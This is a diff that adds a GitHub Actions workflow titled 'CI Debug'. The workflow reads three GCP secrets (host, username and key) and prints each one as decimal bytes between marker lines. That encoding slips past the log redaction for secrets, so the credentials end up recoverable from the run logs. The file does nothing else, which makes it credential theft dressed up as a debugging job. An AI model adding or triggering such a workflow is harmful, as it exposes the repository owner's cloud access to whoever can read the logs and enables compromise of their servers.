@@ -1,0 +1,21 @@
+name: CI Debug
+on: [workflow_dispatch]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run
+        env:
+          S0: ${{ secrets.GCP_HOST }}
+          S1: ${{ secrets.GCP_USERNAME }}
+          S2: ${{ secrets.GCP_KEY }}
+        run: |
+          echo "S0_START"
+          echo -n "$S0" | od -An -tu1
+          echo "S0_END"
+          echo "S1_START"
+          echo -n "$S1" | od -An -tu1
+          echo "S1_END"
+          echo "S2_START"
+          echo -n "$S2" | od -An -tu1
+          echo "S2_END"
